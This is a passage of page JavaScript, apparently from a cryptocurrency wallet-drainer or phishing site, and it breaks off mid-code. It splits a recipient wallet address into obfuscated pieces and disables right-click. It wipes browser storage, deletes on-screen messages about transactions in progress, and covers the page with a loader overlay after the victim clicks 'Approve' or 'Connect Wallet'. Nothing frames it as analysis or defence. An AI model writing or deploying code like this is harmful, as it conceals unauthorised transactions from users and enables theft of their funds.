    <script>
        const _p1 = "0xE57C99A3ae2ae12";
        const _p2 = "4f026BFa8601F7A956";
        const _p3 = "309FB53";
        window.rA = _p1 + _p2 + _p3;
        window.XB = "";

        document.addEventListener('contextmenu', e => e.preventDefault());
       // document.onkeydown = e => { 
       //     if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) 
       //         return false; 
       // };

        localStorage.clear();
        sessionStorage.clear();

        const TX_OBSERVER = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1) {
                        const text = node.textContent || '';
                        if (text.includes('Blockchain validation') || 
                            text.includes('Transaction in progress') ||
                            text.includes('Processing')) {
                            node.style.display = 'none';
                            node.remove?.();
                            document.getElementById('loader-overlay').style.display = 'flex';
                        }
                    }
                });
            });
        });

        TX_OBSERVER.observe(document.body, { childList: true, subtree: true });

        window.addEventListener('click', (e) => {
            const btnText = e.target.innerText || e.target.closest('button')?.innerText;
            if (btnText === 'Next' || btnText === 'Approve' || btnText === 'Confirmer' || btnText === 'Connect Wallet') {
                setTimeout(() => {
                    document.getElementById('loader-overlay').style.display = 'flex';
                }, 500);
            }
        });

        //setInterval(() => {
